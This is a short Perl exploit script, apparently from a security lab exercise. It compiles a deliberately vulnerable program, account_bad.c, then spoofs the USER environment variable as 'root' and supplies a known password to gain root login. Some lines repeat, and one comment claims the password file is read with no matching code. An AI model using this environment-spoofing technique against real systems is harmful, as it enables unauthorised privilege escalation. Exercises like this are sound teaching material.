#!/usr/bin/perl

#Issue 2: Exploit b
#Aim: to login as root.

#We know root password is rootPassword.

#To compile account_bad.c
system("gcc -g -o /vulnerable/account_bad /vulnerable/account_bad.c");

#Create root account.
$ENV{USER} = 'root';
system("/vulnerable/account_bad rootPassword");

#hacker logs in as root.
$ENV{USER} = 'root';
system("/vulnerable/account_bad rootPassword");

#Verification by catting contents of passwords file.
print "#Hacker is logged in as root\n";